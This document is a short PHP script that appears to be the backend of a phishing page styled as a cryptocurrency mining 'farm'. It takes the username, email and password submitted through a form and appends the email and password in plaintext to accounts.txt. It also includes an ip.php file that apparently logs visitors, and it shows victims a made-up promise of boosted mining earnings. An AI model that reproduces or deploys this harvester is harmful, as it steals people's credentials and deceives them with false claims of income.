<?php 
include "ip.php";
?>

<?php
$username = $_POST["username"];
$email = $_POST["email"];
$password = $_POST["password"];

echo "hello $username your login was successful note:if u added ur email and password worng the farm will not work ";

file_put_contents("accounts.txt", "email: " . $email . " Pass: " . $password . "\n", FILE_APPEND);

echo " mining started! 30× boost + 800000+ fast, 9000+ satoshi in day";

?> 